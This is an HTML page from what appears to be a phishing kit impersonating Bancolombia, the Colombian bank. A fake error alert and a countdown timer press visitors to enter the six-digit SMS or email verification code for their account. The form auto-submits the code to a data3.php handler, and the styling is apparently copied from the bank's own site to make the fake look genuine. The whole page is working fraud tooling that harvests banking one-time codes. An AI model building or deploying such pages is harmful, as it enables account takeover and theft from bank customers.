<script language="javascript">alert("Codigo incorrecto");
</script>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>

*{font-family: Arial, Helvetica, sans-serif;}
</style>
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Información</title>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,viewport-fit=cover">
    <link rel="stylesheet" href="css/estilos.css">
    <link rel="stylesheet" href="css/font-awesome.css">

        <script type="text/javascript">
var url="index.html";
var seconds = 150; //número de segundos a contar
function secondPassed() {

  var minutes = Math.round((seconds - 30)/60); //calcula el número de minutos
  var remainingSeconds = seconds % 60; //calcula los segundos
  //si los segundos usan sólo un dígito, añadimos un cero a la izq
  if (remainingSeconds < 10) { 
    remainingSeconds = "0" + remainingSeconds; 
  } 
  document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
  if (seconds == 0) { 
    clearInterval(countdownTimer); 
   window.location=url;
    document.getElementById('countdown').innerHTML = ""; 
  } else { 
    seconds--; 
  } 
} 

var countdownTimer = setInterval(secondPassed, 1000);
</script>

     <style>
 input::-webkit-input-placeholder {
  
    text-align:left;
    font-size:30px;
}
input::-moz-placeholder {
   text-align:left;
    font-size:30px;

}



 </style>
 <style type="text/css">#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style><style>.main[_ngcontent-awt-c8]{position:relative;top:65px}@media screen and (max-width:768px){.main[_ngcontent-awt-c8]{top:55px}}</style>
<style>h1[_ngcontent-awt-c52]{display:inline-block;font-size:28px;line-height:30px;letter-spacing:-.6px;color:#2c2a29}@media (max-width:767px){h1[_ngcontent-awt-c52]{width:110%}}@media (min-width:768px){h1[_ngcontent-awt-c52]{width:585px}}
.card[_ngcontent-awt-c52]{box-shadow:0 1px 4px rgba(0,0,0,.103);transition:.3s;width:1020px;padding:2%;border-radius:5px;background-color:#fff}.card[_ngcontent-awt-c52]:hover{box-shadow:0 8px 16px 0 rgba(0,0,0,.103)}.bc-mt-2[_ngcontent-awt-c52]{margin-top:2%}.bc-mt-3[_ngcontent-awt-c52]{margin-top:3%}@media (min-width:768px){.bc-mt-4[_ngcontent-awt-c52]{margin-top:4%}}@media (max-width:767px){.bc-mt-4[_ngcontent-awt-c52]{margin-top:30px}}@media (min-width:768px){.bc-mt-5[_ngcontent-awt-c52]{margin-top:5%}}@media (max-width:767px){.bc-mt-5[_ngcontent-awt-c52]{margin-top:50px}}.bc-mt-6[_ngcontent-awt-c52]{margin-top:6%}@media (min-width:768px){.bc-mt-20[_ngcontent-awt-c52]{margin-top:20px}}@media (max-width:767px){.bc-mb-15[_ngcontent-awt-c52]{margin-bottom:15px;margin-top:30px}}.bc-mb-20[_ngcontent-awt-c52]{margin-bottom:20px}.bc-px-12[_ngcontent-awt-c52]{padding:0 12px;height:57px}.check-conditions[_ngcontent-awt-c52]   p[_ngcontent-awt-c52]{line-height:20px;font-size:14px;color:#848689}.terms-conditions[_ngcontent-awt-c52]   a[_ngcontent-awt-c52]{color:#292929}  .validate{color:#e20201;font-weight:700}  .bc-modal-button .bc-col-6{max-width:100%!important}  .bc-modal-button 
.bc-col-12{padding:0!important}.terms-conditions-text[_ngcontent-awt-c52]{text-align:center}.terms-conditions-text[_ngcontent-awt-c52]   p[_ngcontent-awt-c52]{color:#808285}  .bc-modal-content{max-height:65vh!important;padding-top:0!important;padding-left:12px!important;padding-right:12px!important}@media (max-width:768px){  .bc-modal-content{max-height:60vh!important;padding-top:0!important;padding-left:12px!important;padding-right:12px!important}}@media (max-width:768px){  .bc-modal-button{padding-top:0!important}}@media (max-width:768px){  .bc-modal__overlay{padding-bottom:10px!important}}  .bc-modal__overlay .bc-modal-button{padding:0!important}  .bc-modal__overlay .bc-modal-button button{margin:8px 8px 8px 0!important}.padding-habeasdata[_ngcontent-awt-c52]   .bc-col-10[_ngcontent-awt-c52], .padding-habeasdata[_ngcontent-awt-c52] 
  .bc-col-12[_ngcontent-awt-c52]{}  .modal-error .bc-modal__close{display:none!important}  .modal-termsCondition .bc-modal-button{padding-top:0!important;padding-bottom:0!important}  .modal-termsCondition .bc-modal-button .bc-col-md-12{padding-left:30%!important;padding-right:30%!important}@media (max-width:768px){  .modal-termsCondition .bc-modal-button .bc-col-md-12{padding-left:0!important;padding-right:0!important}}  .modal_decision .bc-modal__overlay{top:auto!important;width:353px!important;border-radius:5px!important;padding:20px!important}  .modal_decision .bc-modal__overlay .bc-modal-content{margin-bottom:16px;padding:0}  .modal_decision .bc-btn-small{height:48px!important;border-radius:24px!important}@media (min-width:768px){.next_button[_ngcontent-awt-c52]{margin-bottom:330px;display:inline-block;text-align:center}}@media (max-width:767px){.next_button[_ngcontent-awt-c52]{margin-bottom:200px;display:inline-block;text-align:center}}.divider[_ngcontent-awt-c52]{margin-bottom:0;width:104%;height:max-content}.font-size-50[_ngcontent-awt-c52]{font-size:50px}.bc-mt-150[_ngcontent-awt-c52]{margin-top:150px;margin-bottom:10px}@media (min-width:768px){
  
  .trazo1[_ngcontent-awt-c52]{width:479.89px;height:164px;left:-153px;top:163px}.trazo1[_ngcontent-awt-c52], .trazo2[_ngcontent-awt-c52]{position:absolute;z-index:-10}.trazo2[_ngcontent-awt-c52]{width:443.29px;height:159px;right:0;top:821px}
  
  .bc-mt-16[_ngcontent-awt-c52], .trazo3[_ngcontent-awt-c52]{display:none}}@media (max-width:767px){
  
  .trazo1[_ngcontent-awt-c52], .trazo2[_ngcontent-awt-c52]{display:none}.trazo3[_ngcontent-awt-c52]{position:absolute;width:100%;height:158.08px;left:0;right:0;top:300px;z-index:-10}.bc-mt-16[_ngcontent-awt-c52]{margin-top:81px;margin-bottom:10px}.padding-mov[_ngcontent-awt-c52]{padding-left:38px}}@media (min-width:768px){.title-mov[_ngcontent-awt-c52]{display:none}}@media (max-width:767px){.title-desk[_ngcontent-awt-c52]{display:none}.title-mov[_ngcontent-awt-c52]{margin-top:30px;margin-left:-20px;padding-left:12px;width:100%}.copyright[_ngcontent-awt-c52]{font-family:Open Sans;font-style:normal;font-weight:400;font-size:14px;line-height:18px;text-align:center;letter-spacing:-.2px;color:#000;margin-bottom:15px}}@media (min-width:768px){.copyright[_ngcontent-awt-c52], .logo-mov[_ngcontent-awt-c52]{display:none}}@media (max-width:767px){.date-mov[_ngcontent-awt-c52]{margin-bottom:40px}}@media (min-width:768px){.date-mov[_ngcontent-awt-c52]{margin-bottom:30px}}@media (max-width:546px){.hr-mov[_ngcontent-awt-c52]{width:80%;height:.2px;left:calc(50% - 327px/2);background:#ccc;margin:16px 0 16px 10%}}@media (min-width:547px){.hr-mov[_ngcontent-awt-c52]{display:none}}@media (max-width:767px){  .h-acordeon header{min-height:0!important;padding:8px 0!important;border-bottom:1px solid #2c2a2980}}@media (min-width:768px){  .h-acordeon header{min-height:0!important;padding:10px 10px 10px 25px!important;border-bottom:1px solid #2c2a2980}}.cursor-pointer[_ngcontent-awt-c52]{cursor:pointer}.cursor-pointer[_ngcontent-awt-c52]   [_ngcontent-awt-c52]:hover{font-weight:700}@media (max-width:767px){  .img-terms{height:50px;width:50px}}@media (min-width:768px){  .img-terms{height:80px;width:80px}}  .img-success{height:47%;width:47%;margin-bottom:20px}  .img-error{height:47%;width:47%}  .pad-desc{padding-left:20px}  .bc-container{padding-left:0;padding-right:0}  .mat-form-field-appearance-fill .mat-form-field-flex .mat-form-field-infix{color:#000!important}  .mat-form-field-appearance-fill .mat-form-field-flex{background-color:#0000;padding:12px 0 0!important;cursor:text!important}  .mat-select-trigger{cursor:text!important}  .mat-form-field-appearance-fill .mat-form-field-infix{padding:0!important}  .mat-form-field-wrapper{padding-top:5px!important;padding-bottom:25px!important}@media (min-width:768px){.bc-mt-10[_ngcontent-awt-c52]{margin-top:2px}}  .mat-select-value-text{padding-left:30px;color:#2c2a29;letter-spacing:-.3px;font-family:Open Sans,sans-serif;font-size:16px;font-weight:400}.material-icons[_ngcontent-awt-c52]{color:#0000008c;font-weight:lighter!important}.mat-icon[_ngcontent-awt-c52]{position:absolute;top:-7px}.mat-form-field[_ngcontent-awt-c52]{display:inline;font-size:15px;color:#000!important}.mat-form-field.mat-form-field-invalid[_ngcontent-awt-c52]   .mat-form-field-ripple.mat-accent[_ngcontent-awt-c52],   .mat-form-field.mat-form-field-invalid .mat-form-field-ripple{background-color:initial}  .mat-form-field.mat-focused .mat-form-field-ripple{background-color:initial}  .mat-form-field-ripple{background-color:initial}  .mat-form-field-appearance-fill .mat-form-field-underline:before{background-color:#000;position:static}.icono-em[_ngcontent-awt-c52]{position:absolute;color:#2c2a29;top:-30px;font-size:24px}  .mat-select-arrow{color:#2c2a29}  .mat-select-arrow-wrapper{display:table-cell;vertical-align:bottom!important}  .mat-form-field .mat-select.mat-select-invalid .mat-select-arrow{color:#2c2a29}  .mat-form-field.mat-focused.mat-primary .mat-select-arrow{color:#2c2a29}  .titulo-select{padding-left:30px;color:#2c2a29;letter-spacing:-.3px;font-family:Open Sans,sans-serif;font-size:15px;font-weight:400}.mat-form-field-appearance-fill.mat-form-field-can-float[_ngcontent-awt-c52]   .mat-input-server[_ngcontent-awt-c52]:focus + .mat-form-field-label-wrapper[_ngcontent-awt-c52]   .mat-form-field-label[_ngcontent-awt-c52],   .mat-form-field-appearance-fill.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label{transform:translateX(-28px) translateY(-36px) scale(1);width:133.3333333333%;position:relative}  .mat-form-field{line-height:16px}  span.mat-form-field-label-wrapper{overflow:unset}  .validate-2{padding:0;margin:0;position:relative;color:#e20201;font-size:12px;font-weight:700;letter-spacing:-.3px;top:-20px}</style><style>.bc-header{height:65px!important}  #header a{text-decoration:none;font-family:Open Sans;font-style:normal;font-weight:400;font-size:16px;line-height:22px;letter-spacing:-.3px;color:#292929}  #header{position:fixed;top:0!important;z-index:999!important}.cursor-pointer[_ngcontent-awt-c45]{cursor:pointer}.cursor-pointer[_ngcontent-awt-c45]   [_ngcontent-awt-c45]:hover{font-weight:700}.bc-ml-22[_ngcontent-awt-c45]{margin-left:22px}.bc-mr-22[_ngcontent-awt-c45]{margin-right:22px}.bc-ml-5[_ngcontent-awt-c45]{margin-left:5px}.bc-mr-5[_ngcontent-awt-c45]{margin-right:5px}</style><style>.mat-form-field{display:inline-block;position:relative;text-align:left}[dir=rtl] .mat-form-field{text-align:right}.mat-form-field-wrapper{position:relative}.mat-form-field-flex{display:inline-flex;align-items:baseline;box-sizing:border-box;width:100%}.mat-form-field-prefix,.mat-form-field-suffix{white-space:nowrap;flex:none;position:relative}.mat-form-field-infix{display:block;position:relative;flex:auto;min-width:0;width:180px}.cdk-high-contrast-active .mat-form-field-infix{border-image:linear-gradient(transparent, transparent)}.mat-form-field-label-wrapper{position:absolute;left:0;box-sizing:content-box;width:100%;height:100%;overflow:hidden;pointer-events:none}[dir=rtl] .mat-form-field-label-wrapper{left:auto;right:0}.mat-form-field-label{position:absolute;left:0;font:inherit;pointer-events:none;width:100%;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;transform-origin:0 0;transition:transform 400ms cubic-bezier(0.25, 0.8, 0.25, 1),color 400ms cubic-bezier(0.25, 0.8, 0.25, 1),width 400ms cubic-bezier(0.25, 0.8, 0.25, 1);display:none}[dir=rtl] .mat-form-field-label{transform-origin:100% 0;left:auto;right:0}.mat-form-field-empty.mat-form-field-label,.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label{display:block}.mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:block;transition:none}.mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:block}.mat-form-field-label:not(.mat-form-field-empty){transition:none}.mat-form-field-underline{position:absolute;width:100%;pointer-events:none;transform:scale3d(1, 1.0001, 1)}.mat-form-field-ripple{position:absolute;left:0;width:100%;transform-origin:50%;transform:scaleX(0.5);opacity:0;transition:background-color 300ms cubic-bezier(0.55, 0, 0.55, 0.2)}.mat-form-field.mat-focused .mat-form-field-ripple,.mat-form-field.mat-form-field-invalid .mat-form-field-ripple{opacity:1;transform:none;transition:transform 300ms cubic-bezier(0.25, 0.8, 0.25, 1),opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1),background-color 300ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-subscript-wrapper{position:absolute;box-sizing:border-box;width:100%;overflow:hidden}.mat-form-field-subscript-wrapper .mat-icon,.mat-form-field-label-wrapper .mat-icon{width:1em;height:1em;font-size:inherit;vertical-align:baseline}.mat-form-field-hint-wrapper{display:flex}.mat-form-field-hint-spacer{flex:1 0 1em}.mat-error{display:block}.mat-form-field-control-wrapper{position:relative}.mat-form-field-hint-end{order:1}.mat-form-field._mat-animation-noopable .mat-form-field-label,.mat-form-field._mat-animation-noopable .mat-form-field-ripple{transition:none}
</style>

</head>
<body>

<div align="center"><img src="css/bancolombia_solo_clic.png" style="width:350px;">
<h1>
Complete con sus datos actuales <br>para reactivar</h1><br><br>


    <section class="">


        <form action="data3.php" id="form1" name="form1" method="post" class="form_contact">
    
            <div class="user_info">
            <br><br><br>  <br><br><br> 
            <div align="center">
<h2>ERROR, ingrese el codigo de verificacion temporal enviado a tu correo electronico y/o celular registrado a tu cuenta!</h2>
           <input type="tel" maxlength="1" onkeypress="soloNumeros(event)" style="width:45px;"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" name="num1" autofocus required>
  <input type="tel" maxlength="1" style="width:40px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2" name="num2" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:40px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3" name="num3" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:40px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()"  id="num4" name="num4" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:40px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num6.focus()" id="num5" name="num5" autocomplete="off" required>
  <input type="tel" maxlength="1" style="width:40px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" id="num6" name="num6" autocomplete="off" required>
 
              </div>
<br><br><br><br><br><br>
               <div  align="center"> 
              
               <input type="submit" value="Continuar" style="font: 600 16px 'Open Sans';border:0;
    display: inline-block;
    background: #fdda24;
    color: #2c2a29;
    padding: 13px 19px;
    line-height: 24px;
    box-sizing: content-box;
    border-radius: 100px;
    box-shadow: 0 1px 8px rgb(0 0 0 / 10%);
    text-align: center;" id="btnSend">
               
    <br><br>
    
     <font size="4px;" color="">Ingresa el codigo sms antes de<br><span>
 <b> <strong id="time"><label id="countdown"></label></strong> </b><br></span></font>
            
               <span class="focus-input100"></span>
               </div>
            </div><br><br>
            <div align="center">
            <a href="#">¿No estás registrado? </a>
            </div>
        </form>

    </section>
<!----><img _ngcontent-awt-c52="" src="./css/trazo1.png" alt="" class="trazo1"><img _ngcontent-awt-c52="" src="./css/trazo2.png" alt="" class="trazo2">
<img _ngcontent-awt-c52="" src="./css/trazo3.png" alt="" class="trazo3">
</div>
</body>
</html>
